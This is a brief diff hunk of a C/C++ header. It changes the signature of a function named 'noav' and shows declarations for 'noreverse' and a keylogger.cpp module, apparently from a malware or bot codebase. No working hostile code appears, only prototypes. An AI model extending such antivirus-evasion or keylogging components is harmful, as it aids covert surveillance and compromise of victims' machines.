@@ -5,7 +5,7 @@ extern FILE * debug_log_stream;
 #endif
 
 // From noav.cpp
-extern void noav(void);
+extern BOOL noav(BOOL InThread);
 extern void noreverse(void);
 
 // From keylogger.cpp
